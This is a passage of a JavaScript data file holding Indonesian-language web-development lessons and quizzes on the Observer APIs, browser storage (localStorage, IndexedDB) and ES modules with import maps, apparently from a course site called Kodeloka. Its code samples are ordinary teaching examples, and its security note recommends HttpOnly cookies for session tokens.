    rootMargin: &quot;-10% 0px -70% 0px&quot;, // Memfokuskan zona deteksi di sepertiga atas layar
    threshold: 0 // Panggil segera begitu 1 piksel pertama menyentuh zona
  }
);

// Daftarkan seluruh elemen &lt;section&gt; untuk diamati oleh SATU instance observer!
for (const bab of daftarBab) {
  pengamatVisibilitas.observe(bab);
}

//Catatan: Jika komponen dihapus, hentikan pengamatan dengan pengamatVisibilitas.disconnect()</pre>
<h3>Kegunaan Utama <code>IntersectionObserver</code>:</h3>
<ul><li><strong>Infinite Scroll:</strong> Letakkan satu elemen kosong <code>&lt;div id=&quot;pemicu-muat-lagi&quot;&gt;&lt;/div&gt;</code> di bawah daftar kartu; ketika <code>entri.isIntersecting</code> bernilai <code>true</code>, panggil <code>fetch()</code> untuk memuat 10 kartu berikutnya!</li><li><strong>Menjeda Video/Animasi Otomatis:</strong> Ketika pemutar video atau kanvas simulasi keluar dari layar (<code>!entri.isIntersecting</code>), panggil <code>video.pause()</code> untuk menghemat CPU pengguna.</li></ul>
<h2>2. <code>ResizeObserver</code>: Merespons Perubahan Ukuran Elemen Individual</h2>
<p>Berbeda dengan <code>window.addEventListener(&quot;resize&quot;, ...)</code> yang hanya memberi tahu jika <strong>jendela peramban secara keseluruhan</strong> diubah ukurannya, <strong><code>ResizeObserver</code></strong> (status <strong>Baseline Widely Available</strong>) memberi tahu Anda setiap kali <strong>kotak elemen tertentu berubah ukurannya</strong> (misalnya karena bilah samping ditutup, teks baru dimasukkan, atau tata letak Grid bergeser).</p>
<p>Ini sangat penting ketika Anda menggambar grafik di dalam <code>&lt;canvas&gt;</code> yang harus menyesuaikan jumlah pikselnya dengan ukuran wadah pembungkusnya:</p>
<pre>const wadahGrafik = document.querySelector(&quot;#wadah-kanvas&quot;);
const kanvas = wadahGrafik.querySelector(&quot;canvas&quot;);

const pengamatUkuran = new ResizeObserver((daftarEntri) =&gt; {
  for (const entri of daftarEntri) {
    // Membaca lebar dan tinggi border-box elemen yang sudah dihitung peramban
    // (Tanpa memicu Forced Synchronous Layout!)
    const { inlineSize: lebar, blockSize: tinggi } = entri.borderBoxSize[0];

    kanvas.width = Math.round(lebar * window.devicePixelRatio);
    kanvas.height = Math.round(tinggi * window.devicePixelRatio);
    gambarUlangGrafik(kanvas);
  }
});

pengamatUkuran.observe(wadahGrafik);</pre>
<h2>3. <code>MutationObserver</code>: Mengamati Perubahan Struktur atau Atribut Pohon DOM</h2>
<p>Bagaimana jika Anda perlu menjalankan logika tertentu ketika kode lain menambahkan elemen baru ke dalam sebuah wadah atau ketika atribut <code>data-tema</code> pada elemen <code>&lt;html&gt;</code> berubah? Gunakan <strong><code>MutationObserver</code></strong>:</p>
<pre>const pengamatDom = new MutationObserver((daftarMutasi) =&gt; {
  for (const mutasi of daftarMutasi) {
    if (mutasi.type === &quot;attributes&quot; &amp;&amp; mutasi.attributeName === &quot;data-tema&quot;) {
      const temaBaru = document.documentElement.getAttribute(&quot;data-tema&quot;);
      console.log(\`Tema dokumen berubah menjadi: \${temaBaru}\`);
    }
  }
});

pengamatDom.observe(document.documentElement, {
  attributes: true,
  attributeFilter: [&quot;data-tema&quot;] // Hanya amati atribut yang relevan agar tetap ringan!
});</pre>
<h3>Tabel Pemilihan Tiga Observer API</h3>
<table><thead><tr><th>Kebutuhan Anda</th><th>Gunakan Apa?</th></tr></thead><tbody><tr><td>Mengubah tata letak CSS komponen berdasarkan lebar wadahnya</td><td><strong>CSS <code>@container</code> Queries</strong> (Utamakan CSS sebelum JS!).</td></tr><tr><td>Menyesuaikan ukuran <code>&lt;canvas&gt;</code> atau logika JS saat ukuran sebuah elemen berubah</td><td><strong><code>ResizeObserver</code></strong></td></tr><tr><td>Mendeteksi apakah sebuah elemen sedang terlihat di layar (<em>infinite scroll</em>, <em>scrollspy</em>, analitik impresi)</td><td><strong><code>IntersectionObserver</code></strong></td></tr><tr><td>Mendeteksi perubahan atribut atau penambahan/penghapusan simpul anak di pohon DOM</td><td><strong><code>MutationObserver</code></strong></td></tr></tbody></table>
<h2>Latihan Praktik: Daftar Isi <em>Scrollspy</em> dan Pemuat Kartu Otomatis dengan <code>IntersectionObserver</code></h2>
<p>Buatlah berkas <code>observer-latihan.html</code> dan <code>observer.js</code>:</p>
<ol><li>Buat 4 <code>&lt;section id=&quot;bab-1&quot;&gt;</code> s.d. <code>bab-4</code> yang masing-masing setinggi minimal <code>70vh</code>, serta navigasi daftar isi di sampingnya.</li><li>Gunakan satu <code>IntersectionObserver</code> untuk memindahkan atribut <code>aria-current=&quot;location&quot;</code> secara otomatis ke tautan daftar isi yang sesuai dengan bab yang sedang terlihat di layar.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API" rel="noopener">Intersection Observer API — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/IntersectionObserver" rel="noopener"><code>IntersectionObserver</code> — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API/Timing_element_visibility" rel="noopener">Timing element visibility with the Intersection Observer API — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/ResizeObserver" rel="noopener"><code>ResizeObserver</code> — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver" rel="noopener"><code>MutationObserver</code> — MDN Web Docs</a></li></ul></div>
`,
    perintah: ["IntersectionObserver","ResizeObserver","MutationObserver","window.addEventListener(\"scroll\", ...)","getBoundingClientRect()","<canvas>"],
    kuis: [
        {"tanya":"Mengapa menggunakan IntersectionObserver jauh lebih baik bagi performa halaman dibandingkan memasang window.addEventListener(\"scroll\", ...) yang memanggil elemen.getBoundingClientRect()?","opsi":["Karena getBoundingClientRect() hanya bekerja pada elemen <div>.","Karena IntersectionObserver menghitung perpotongan visibilitas elemen secara asinkron di dalam mesin peramban dan hanya memanggil callback ketika ambang batas visibilitas dilewati, tanpa membanjiri utas utama di setiap piksel guliran dan tanpa memicu Forced Synchronous Layout.","Karena event scroll tidak berfungsi di perangkat layar sentuh.","Karena IntersectionObserver otomatis mengunduh gambar dari server."],"benar":1,"penjelasan":"Dengan IntersectionObserver, Anda tidak perlu melakukan polling koordinat elemen secara terus-menerus pada setiap piksel guliran; peramban yang memberi tahu Anda tepat saat elemen masuk atau keluar dari area pandang."},
        {"tanya":"Properti apakah pada objek IntersectionObserverEntry di dalam callback IntersectionObserver yang bernilai boolean true ketika elemen target sedang masuk/berpotongan dengan area pandang (root)?","opsi":["entry.isVisibleNow","entry.isIntersecting","entry.inViewport","entry.hasScrolled"],"benar":1,"penjelasan":"Properti standar entry.isIntersecting bernilai true saat elemen target berpotongan dengan area root sesuai ambang batas threshold yang ditentukan, dan berubah menjadi false saat elemen keluar dari area tersebut."},
        {"tanya":"Kapan Anda perlu menggunakan ResizeObserver di JavaScript padahal CSS sudah memiliki @container queries?","opsi":["Untuk mengubah font-size dan grid-template-columns biasa.","Ketika perubahan ukuran wadah mengharuskan eksekusi logika JavaScript non-CSS—seperti mengatur ulang atribut piksel canvas.width dan menggambar ulang grafik 2D/WebGL di dalam <canvas>.","Karena @container hanya bekerja di Firefox.","Untuk mendeteksi apakah pengguna menekan tombol Esc."],"benar":1,"penjelasan":"Untuk penataan gaya dan tata letak, selalu gunakan CSS @container. Namun, atribut resolusi internal <canvas width=\"...\" height=\"...\"> dan penggambaran ulang konteks 2D/WebGL hanya dapat diperbarui melalui JavaScript, di mana ResizeObserver menjadi solusi yang paling tepat."}
    ]
},
{
    id: 15,
    kategori: "4 · DOM & Peramban",
    judul: "Penyimpanan Data di Peramban: localStorage, sessionStorage, dan IndexedDB",
    tingkat: "Menengah", durasi: "9 mnt",
    tag: ["localStorage","sessionStorage","IndexedDB"],
    ringkas: "Menyimpan state aplikasi di sisi klien menggunakan Web Storage API (localStorage dan sessionStorage), membungkus serialisasi JSON dengan aman, menyinkronkan data antar-tab dengan event storage, serta memilih antara Web Storage, IndexedDB, dan HTTP Cookie.",
    isi: `
<h2>Memilih Mekanisme Penyimpanan di Peramban</h2>
<p>Peramban modern menyediakan beberapa tempat penyimpanan data dengan karakteristik, masa hidup, dan tingkat keamanan yang berbeda. Perhatikan perbandingan berikut sebelum memutuskan tempat menyimpan data:</p>
<table><thead><tr><th>Mekanisme</th><th>Kapasitas Umum</th><th>Masa Hidup Data</th><th>Apakah Otomatis Dikirim ke Server di Setiap Request HTTP?</th><th>Kasus Penggunaan Terbaik</th></tr></thead><tbody><tr><td><strong><code>localStorage</code></strong></td><td>~5 MB per <em>origin</em></td><td>Permanen hingga dihapus oleh skrip atau pengguna.</td><td><strong>Tidak</strong> (murni di sisi klien).</td><td>Preferensi tema (gelap/terang), progres modul belajar, penanda (<em>bookmark</em>), draf formulir.</td></tr><tr><td><strong><code>sessionStorage</code></strong></td><td>~5 MB per <em>origin</em></td><td>Hanya selama <strong>satu tab</strong> terbuka (hilang saat tab ditutup).</td><td><strong>Tidak</strong> (murni di sisi klien).</td><td>State langkah formulir multi-tahap (<em>wizard</em>) atau posisi filter sementara di tab tersebut.</td></tr><tr><td><strong><code>IndexedDB</code></strong></td><td>Ratusan MB hingga GB (sesuai ruang diska)</td><td>Permanen hingga dihapus.</td><td><strong>Tidak</strong> (asinkron, mendukung transaksi &amp; indeks).</td><td>Aplikasi <em>offline-first</em>, menyimpan ribuan objek terstruktur, atau berkas biner (<code>Blob</code>/<code>File</code>).</td></tr><tr><td><strong>HTTP Cookie (<code>HttpOnly</code>)</strong></td><td>~4 KB</td><td>Sesuai <code>Max-Age</code> / <code>Expires</code>.</td><td><strong>Ya, selalu dikirim otomatis</strong> melalui header <code>Cookie</code>.</td><td><strong>Identitas sesi autentikasi (<code>session_id</code>) yang wajib dilindungi dari JavaScript!</strong></td></tr></tbody></table>
<div class="callout bahaya"><div class="callout-judul">🚫 Aturan Keamanan Mutlak: Jangan Menyimpan Token Rahasia / Sesi Login Sensitif di <code>localStorage</code>!</div><p>Semua data di dalam <code>localStorage</code> dan <code>sessionStorage</code> dapat dibaca secara bebas oleh <strong>setiap baris JavaScript</strong> yang berjalan di halaman tersebut. Jika situs Anda mengalami satu saja celah XSS (atau memuat skrip pihak ketiga yang disusupi), penyerang cukup memanggil <code>localStorage.getItem(&quot;token&quot;)</code> untuk mencuri akun pengguna! Untuk sesi login produksi, gunakan <strong>Cookie dengan atribut <code>HttpOnly</code>, <code>Secure</code>, dan <code>SameSite</code></strong> yang diatur oleh server.</p></div>
<h2>1. Menggunakan <code>localStorage</code> dan <code>sessionStorage</code> dengan Aman</h2>
<p>Kunci dan nilai yang disimpan di dalam <code>localStorage</code> maupun <code>sessionStorage</code> <strong>selalu bertipe <code>string</code></strong>. Jika Anda langsung menyimpan objek <code>localStorage.setItem(&quot;profil&quot;, { nama: &quot;Adi&quot; })</code>, nilainya akan rusak menjadi string <code>&quot;[object Object]&quot;</code>!</p>
<p>Oleh karena itu, selalu gunakan <strong><code>JSON.stringify()</code></strong> saat menyimpan objek/array, dan <strong><code>JSON.parse()</code></strong> saat membacanya kembali—serta <strong>selalu bungkus di dalam <code>try...catch</code></strong>!</p>
<h3>Mengapa <code>localStorage</code> Wajib Dibungkus <code>try...catch</code>?</h3>
<ol><li><strong><code>setItem()</code> dapat melempar <code>QuotaExceededError</code>:</strong> Ketika penyimpanan penuh atau pada mode penyamaran (<em>private browsing</em>) tertentu yang membatasi kuota.</li><li><strong>Pengguna dapat memblokir data situs:</strong> Memanggil <code>localStorage</code> saat pengaturan privasi peramban memblokir penyimpanan lokal dapat melempar <code>SecurityError</code>.</li><li><strong><code>JSON.parse()</code> dapat melempar <code>SyntaxError</code>:</strong> Jika data di penyimpanan lokal termodifikasi atau rusak.</li></ol>
<pre>// Pembungkus penyimpanan lokal yang aman dan siap pakai di produksi
export const penyimpananLokal = {
  ambil(kunci, nilaiBawaan = null) {
    try {
      const teksMentah = window.localStorage.getItem(kunci);
      if (teksMentah === null) return nilaiBawaan;
      return JSON.parse(teksMentah);
    } catch (galat) {
      console.warn(\`Gagal membaca kunci '\${kunci}' dari localStorage:\`, galat);
      return nilaiBawaan;
    }
  },

  simpan(kunci, nilai) {
    try {
      const teksJson = JSON.stringify(nilai);
      window.localStorage.setItem(kunci, teksJson);
      return true;
    } catch (galat) {
      console.warn(\`Gagal menyimpan kunci '\${kunci}' ke localStorage:\`, galat);
      return false;
    }
  },

  hapus(kunci) {
    try {
      window.localStorage.removeItem(kunci);
    } catch (galat) {
      console.warn(\`Gagal menghapus kunci '\${kunci}':\`, galat);
    }
  }
};</pre>
<p><em>(Catatan: Pola inilah yang dipakai oleh Kodeloka sendiri untuk menyimpan progres modul, penanda, dan catatan belajar Anda di peramban!)</em></p>
<h2>2. Menyinkronkan State Antar-Tab secara Real-Time dengan Event <code>storage</code></h2>
<p>Bagaimana jika pengguna membuka situs Kodeloka di <strong>Tab A</strong> dan <strong>Tab B</strong> secara bersamaan, lalu di Tab A ia mengganti tema menjadi <em>Mode Gelap</em> atau menyelesaikan <em>Modul 5</em>?</p>
<p>Ketika <code>localStorage</code> diubah di <strong>Tab A</strong>, peramban secara otomatis menembakkan event <strong><code>&quot;storage&quot;</code></strong> pada objek <code>window</code> di **semua tab lain (Tab B, Tab C) yang membuka domain (<em>origin</em>) yang sama**:</p>
<pre>window.addEventListener(&quot;storage&quot;, (event) =&gt; {
  // event.key      -&gt; Nama kunci yang berubah (mis. &quot;kodeloka:tema&quot;)
  // event.oldValue -&gt; Nilai string lama sebelum berubah
  // event.newValue -&gt; Nilai string baru setelah berubah
  if (event.key === &quot;kodeloka:tema&quot; &amp;&amp; event.newValue) {
    const temaBaru = JSON.parse(event.newValue);
    document.documentElement.setAttribute(&quot;data-tema&quot;, temaBaru);
  }
});</pre>
<h2>3. Pengantar <code>IndexedDB</code> untuk Data Berukuran Besar dan Asinkron</h2>
<p>Karena <code>localStorage</code> bersifat <strong>sinkron</strong> (memblokir utas utama saat membaca/menulis string besar) dan dibatasi sekitar 5 MB, jangan gunakan <code>localStorage</code> untuk menyimpan ribuan baris katalog atau dokumen panjang.</p>
<p>Untuk kebutuhan tersebut, gunakan <strong><code>IndexedDB</code></strong>—basis data NoSQL transaksional bawaan peramban yang bekerja secara <strong>asinkron</strong>:</p>
<pre>// Membuka koneksi IndexedDB dan membungkusnya dengan Promise modern
function bukaDatabaseCatatan() {
  return new Promise((resolve, reject) =&gt; {
    const permintaan = window.indexedDB.open(&quot;KodelokaDB&quot;, 1);

    // Dijalankan saat basis data pertama kali dibuat atau versinya dinaikkan
    permintaan.onupgradeneeded = (event) =&gt; {
      const db = event.target.result;
      if (!db.objectStoreNames.contains(&quot;catatan_modul&quot;)) {
        db.createObjectStore(&quot;catatan_modul&quot;, { keyPath: &quot;idModul&quot; });
      }
    };

    permintaan.onsuccess = () =&gt; resolve(permintaan.result);
    permintaan.onerror = () =&gt; reject(permintaan.error);
  });
}</pre>
<h2>Latihan Praktik: Menyimpan Draf Catatan Otomatis (<em>Auto-Save</em>) dan Sinkronisasi Antar-Tab</h2>
<p>Buatlah berkas <code>penyimpanan-catatan.html</code> dan <code>penyimpanan.js</code>:</p>
<ol><li>Sediakan sebuah <code>&lt;textarea id=&quot;editor-catatan&quot;&gt;</code> dan indikator status <code>&lt;output id=&quot;status-simpan&quot;&gt;</code>.</li><li>Setiap kali pengguna mengetik (event <code>&quot;input&quot;</code>), simpan isi catatan beserta waktu pembaruannya ke <code>localStorage</code> menggunakan pembungkus <code>try...catch</code> yang aman.</li><li>Saat halaman dimuat ulang, pulihkan kembali isi <code>&lt;textarea&gt;</code> dari <code>localStorage</code>.</li><li>Tambahkan pendengar <code>window.addEventListener(&quot;storage&quot;, ...)</code> agar ketika halaman dibuka di dua tab berdampingan, ketikan di Tab 1 langsung muncul di Tab 2!</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API" rel="noopener">Using the Web Storage API — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" rel="noopener"><code>Window: localStorage</code> property — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API" rel="noopener">Web Storage API — MDN Web Docs</a></li></ul></div>
`,
    perintah: ["localStorage","sessionStorage","IndexedDB","try...catch","HttpOnly","JSON.parse()"],
    kuis: [
        {"tanya":"Apa yang terjadi jika Anda menjalankan kode localStorage.setItem(\"skor\", 100) lalu membacanya kembali dengan const nilai = localStorage.getItem(\"skor\")?","opsi":["nilai bertipe number (100).","nilai bertipe string (\"100\"), karena Web Storage API hanya menyimpan dan mengembalikan nilai dalam bentuk teks string.","localStorage.setItem melempar TypeError karena argumen kedua bukan string.","nilai bernilai undefined."],"benar":1,"penjelasan":"localStorage dan sessionStorage secara otomatis mengonversi nilai masukan menjadi string (String(100) -> \"100\"). Saat diambil kembali dengan getItem(), hasilnya selalu berupa string (atau null jika kunci tidak ditemukan), sehingga perlu diurai dengan JSON.parse() atau Number()."},
        {"tanya":"Pada tab mana sajakah event window.addEventListener(\"storage\", ...) akan terpanggil ketika sebuah tab mengubah isi localStorage?","opsi":["Hanya pada tab yang sedang memanggil localStorage.setItem() itu sendiri.","Pada semua tab/jendela lain yang sedang membuka situs dari origin (protokol + domain + port) yang sama, kecuali tab yang melakukan perubahan itu sendiri.","Pada seluruh tab peramban termasuk situs dari domain yang berbeda.","Hanya ketika peramban ditutup dan dibuka kembali."],"benar":1,"penjelasan":"Event storage dirancang khusus sebagai mekanisme penyiaran antar-tab (cross-tab synchronization) dalam satu origin yang sama. Tab yang memanggil setItem() sudah mengetahui perubahan yang ia lakukan, sehingga event tersebut dikirimkan ke tab-tab saudara lainnya."},
        {"tanya":"Mengapa token sesi autentikasi yang sensitif sebaiknya disimpan di dalam HTTP Cookie dengan atribut HttpOnly, bukan di dalam localStorage?","opsi":["Karena kapasitas localStorage lebih kecil daripada Cookie.","Karena Cookie dengan atribut HttpOnly tidak dapat diakses melalui document.cookie oleh kode JavaScript di peramban, sehingga melindungi token sesi dari pencurian langsung apabila terjadi serangan Cross-Site Scripting (XSS).","Karena localStorage otomatis terhapus setiap 5 menit.","Karena Cookie tidak pernah dikirimkan ke server."],"benar":1,"penjelasan":"Setiap data di localStorage dapat dibaca oleh skrip mana pun yang berjalan di halaman tersebut. Sebaliknya, cookie beratribut HttpOnly dikelola oleh peramban untuk dikirimkan ke server pada permintaan HTTP tetapi disembunyikan sepenuhnya dari API JavaScript (document.cookie)."}
    ]
},
{
    id: 16,
    kategori: "4 · DOM & Peramban",
    judul: "Modul ES (import / export), Dynamic import(), dan Import Maps",
    tingkat: "Menengah", durasi: "9 mnt",
    tag: ["import","export","import()"],
    ringkas: "Memecah kode aplikasi besar menjadi berkas-berkas modular yang terisolasi menggunakan standar ES Modules (export, import), memuat fitur berat sesuai kebutuhan dengan import() dinamis, menggunakan <script type=\"importmap\">, serta memahami ekosistem package.json.",
    isi: `
<h2>Mengapa Kita Membutuhkan Sistem Modul?</h2>
<p>Pada era awal web, semua berkas JavaScript dimuat dengan deretan <code>&lt;script src=&quot;...&quot;&gt;</code> biasa yang <strong>berbagi satu ruang lingkup global (<code>window</code>) yang sama</strong>. Jika berkas <code>navigasi.js</code> mendeklarasikan variabel <code>let terbuka = false</code>, lalu berkas <code>modal.js</code> di bawahnya juga mendeklarasikan variabel bernama <code>terbuka</code>, keduanya akan saling bertabrakan!</p>
<p>Standar resmi <strong>ES Modules (ESM)</strong> menyelesaikan masalah ini secara permanen:</p>
<ol><li>**Cakupan Terisolasi per Berkas (<em>Module Scope</em>):<strong> Variabel, fungsi, atau class yang Anda tulis di dalam sebuah modul bersifat privat di berkas tersebut, kecuali Anda menandainya secara eksplisit dengan kata kunci </strong><code>export</code>**.</li><li>**Otomatis Berjalan dalam <em>Strict Mode</em> (<code>&quot;use strict&quot;</code>):** Mencegah pembuatan variabel global tak sengaja dan menangkap kesalahan diam-diam sejak dini.</li><li>**Otomatis Bersifat <em>Deferred</em> di Peramban:** Menulis <code>&lt;script type=&quot;module&quot; src=&quot;/app.js&quot;&gt;&lt;/script&gt;</code> di dalam <code>&lt;head&gt;</code> secara otomatis mengunduh modul beserta rantai impornya secara paralel tanpa memblokir pembacaan HTML!</li></ol>
<h2>1. Named Exports vs Default Export</h2>
<p>Ada dua cara mengekspor dan mengimpor fungsionalitas antar-berkas:</p>
<h3>A. Named Exports (Diekspor dengan Nama Pasti — Sangat Direkomendasikan!)</h3>
<p>Satu berkas modul dapat memiliki banyak <em>named export</em>. Keunggulan utamanya: nama fungsi konsisten di seluruh proyek, memudahkan pelengkapan otomatis (<em>autocomplete</em>) di editor kode, dan memudahkan <em>tree-shaking</em> (penghapusan kode tak terpakai).</p>
<pre>// Berkas: ./utilitas/format.js
export const MATA_UANG_BAWAAN = &quot;IDR&quot;;

export function formatRupiah(nominal) {
  return new Intl.NumberFormat(&quot;id-ID&quot;, {
    style: &quot;currency&quot;,
    currency: MATA_UANG_BAWAAN,
    maximumFractionDigits: 0
  }).format(nominal);
}

export function formatTanggal(isoString) {
  return new Intl.DateTimeFormat(&quot;id-ID&quot;, { dateStyle: &quot;long&quot; }).format(new Date(isoString));
}</pre>
<p>Cara mengimpornya di berkas lain:</p>
<pre>// Berkas: ./app.js
// PENTING: Di peramban murni (tanpa bundler), jalur relatif WAJIB diawali './' atau '../'
// dan menyertakan ekstensi berkas '.js'!
import { formatRupiah, formatTanggal as ubahKeTanggalIndo } from &quot;./utilitas/format.js&quot;;

console.log(formatRupiah(150000));                 // &quot;Rp 150.000&quot;
console.log(ubahKeTanggalIndo(&quot;2026-10-16&quot;));      // &quot;16 Oktober 2026&quot;</pre>
<h3>B. Default Export (Maksimal Satu per Berkas)</h3>
<p>Biasanya digunakan jika satu berkas hanya mewakili satu class atau satu komponen utama:</p>
<pre>// Berkas: ./layanan/PenghitungKuis.js
export default class PenghitungKuis {
  // ...
}

// Berkas pemanggil:
import PenghitungKuis from &quot;./layanan/PenghitungKuis.js&quot;;</pre>
<h2>2. Pemuatan Malas Sesuai Kebutuhan dengan Dynamic <code>import()</code></h2>
<p>Pernyataan <code>import ... from &quot;...&quot;</code> di bagian atas berkas bersifat <strong>statis</strong>: seluruh berkas yang diimpor akan diunduh saat halaman dibuka.</p>
<p>Namun, bagaimana jika halaman Anda memiliki fitur berat—seperti <strong>Editor Kode Interaktif</strong> atau <strong>Pengekspor Laporan PDF</strong>—yang hanya digunakan apabila pengguna menekan tombol <em>&quot;Buka Simulator&quot;</em>?</p>
<p>Gunakan fungsi <strong><code>import(jalurModul)</code> dinamis</strong> yang mengembalikan sebuah <strong><code>Promise</code></strong>: berkas JavaScript tersebut baru akan diunduh dari jaringan pada detik pengguna benar-benar mengeklik tombolnya!</p>
<pre>const tombolSimulator = document.querySelector(&quot;#buka-simulator&quot;);

tombolSimulator.addEventListener(&quot;click&quot;, async () =&gt; {
  try {
    tombolSimulator.disabled = true;
    tombolSimulator.textContent = &quot;Memuat mesin simulator...&quot;;

    // Berkas simulator.js baru diunduh saat tombol diklik!
    const modulSimulator = await import(&quot;./fitur/simulator.js&quot;);
    modulSimulator.jalankanSimulator(&quot;#wadah-editor&quot;);
  } catch (galat) {
    console.error(&quot;Gagal memuat modul simulator:&quot;, galat);
  } finally {
    tombolSimulator.disabled = false;
  }
});</pre>
<h2>3. Memetakan Nama Modul di Peramban dengan <code>&lt;script type=&quot;importmap&quot;&gt;</code></h2>
<p>Dulu, menulis <code>import { html } from &quot;lit&quot;;</code> (<em>bare module specifier</em> tanpa <code>./</code> atau <code>https://</code>) hanya bisa dilakukan jika kita memakai <em>bundler</em> (seperti Vite, Webpack, atau Rollup) karena peramban tidak tahu di alamat URL mana kata <code>&quot;lit&quot;</code> berada.</p>
<p>Kini, semua peramban modern mendukung <strong><code>&lt;script type=&quot;importmap&quot;&gt;</code></strong> (status <strong>Baseline Widely Available</strong> sejak Maret 2023) yang memetakan nama singkat modul ke jalur berkas sesungguhnya langsung di HTML:</p>
<pre>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;id&quot;&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;Aplikasi dengan Import Map&lt;/title&gt;

    &lt;!-- Import Map harus diletakkan sebelum &lt;script type=&quot;module&quot;&gt; pertama --&gt;
    &lt;script type=&quot;importmap&quot;&gt;
    {
      &quot;imports&quot;: {
        &quot;@utilitas/&quot;: &quot;/assets/js/utilitas/&quot;,
        &quot;penyimpanan&quot;: &quot;/assets/js/layanan/penyimpanan.js&quot;
      }
    }
    &lt;/script&gt;

    &lt;script type=&quot;module&quot;&gt;
      // Kini kita bisa mengimpor dengan nama bersih tanpa jalur '../../../' yang rumit!
      import { formatRupiah } from &quot;@utilitas/format.js&quot;;
      import { penyimpananLokal } from &quot;penyimpanan&quot;;

      console.log(formatRupiah(250000));
    &lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;&lt;/body&gt;
&lt;/html&gt;</pre>
<h2>4. Mengenal <code>package.json</code> dan Ekosistem Proyek Modern</h2>
<p>Dalam repositori proyek JavaScript (termasuk repositori Kodeloka ini!), berkas <strong><code>package.json</code></strong> di akar proyek berfungsi sebagai manifes utama:</p>
<ul><li><strong><code>&quot;type&quot;: &quot;module&quot;</code>:</strong> Memberitahu Node.js agar memperlakukan semua berkas <code>.js</code> di proyek sebagai <strong>ES Modules</strong> (sehingga mendukung <code>import</code> / <code>export</code> dan <em>Top-Level <code>await</code></em>).</li><li><strong><code>&quot;scripts&quot;</code>:</strong> Pintasan perintah terminal yang dijalankan lewat <code>npm run &lt;nama&gt;</code> (seperti <code>npm run dev</code>, <code>npm run build</code>, <code>npm test</code>).</li><li><strong><code>&quot;dependencies&quot;</code> vs <code>&quot;devDependencies&quot;</code>:</strong> Daftar paket pustaka yang dibutuhkan saat aplikasi berjalan di produksi vs alat bantu pengembangan/pengujian (seperti Playwright untuk tes browser).</li><li><strong><code>package-lock.json</code>:</strong> Mengunci versi persis beserta <em>hash</em> integritas dari setiap paket dan sub-paket agar instalasi via <code>npm ci</code> di komputer seluruh anggota tim dan server CI/CD dijamin 100% identik!</li></ul>
<h2>Latihan Praktik: Memecah Aplikasi Menjadi Tiga Modul Terpisah</h2>
<p>Buatlah folder latihan berisi tiga berkas:</p>
<ol><li><code>konstanta.js</code> yang mengekspor tarif pajak dan daftar diskon.</li><li><code>kalkulator.js</code> yang mengimpor <code>konstanta.js</code> dan mengekspor fungsi <code>hitungHargaBersih(harga, kodeDiskon)</code>.</li><li><code>index.html</code> yang memuat <code>&lt;script type=&quot;importmap&quot;&gt;</code> dan <code>&lt;script type=&quot;module&quot;&gt;</code> untuk menjalankan perhitungan serta memuat modul <code>cetak-struk.js</code> secara dinamis dengan <code>await import(&quot;./cetak-struk.js&quot;)</code> saat tombol ditekan.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules" rel="noopener">JavaScript modules — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/script/type/importmap" rel="noopener"><code>&lt;script type=&quot;importmap&quot;&gt;</code> — MDN Web Docs</a></li><li><a href="https://tc39.es/ecma262/" rel="noopener">ECMAScript Language Specification (Modules) — TC39</a></li></ul></div>
`,
    perintah: ["<script type=\"importmap\">","export","package.json","konstanta.js","<script src=\"...\">","window"],
    kuis: [
        {"tanya":"Apa perilaku bawaan dari elemen <script type=\"module\" src=\"app.js\"></script> ketika diletakkan di dalam <head> dokumen HTML?","opsi":["Menghentikan parser HTML (render-blocking) sama seperti <script> biasa tanpa atribut.","Secara otomatis berperilaku seperti memiliki atribut defer (diunduh secara paralel dan baru dieksekusi setelah dokumen HTML selesai diurai menjadi DOM), berjalan di dalam strict mode, serta memiliki cakupan variabel tingkat modul yang tidak mengotori window.","Hanya dapat dijalankan jika pengguna menyalakan pengaturan khusus di peramban.","Mengizinkan penggunaan variabel tanpa perlu dideklarasikan dengan let atau const."],"benar":1,"penjelasan":"Spesifikasi HTML menetapkan bahwa <script type=\"module\"> secara bawaan bersifat deferred, selalu dieksekusi dalam strict mode, dan mengisolasi seluruh deklarasi tingkat atasnya di dalam module scope."},
        {"tanya":"Kapan Anda sebaiknya menggunakan pemuatan modul dinamis const modul = await import(\"./grafik-berat.js\") dibandingkan pernyataan import statis di baris paling atas berkas?","opsi":["Untuk semua fungsi kecil yang pasti langsung dipakai saat halaman pertama kali dibuka.","Ketika modul tersebut berukuran besar dan hanya dibutuhkan pada kondisi tertentu atau setelah interaksi pengguna (seperti membuka tab analitik atau menekan tombol ekspor), sehingga mempercepat pemuatan awal halaman.","Ketika Anda ingin menjalankan kode secara sinkron tanpa Promise.","Karena import statis sudah tidak didukung di ES2024."],"benar":1,"penjelasan":"Dynamic import() memungkinkan pemecahan kode (code splitting / lazy loading) di mana modul yang jarang dipakai atau berukuran berat ditunda pengunduhannya hingga benar-benar diperlukan oleh pengguna."},
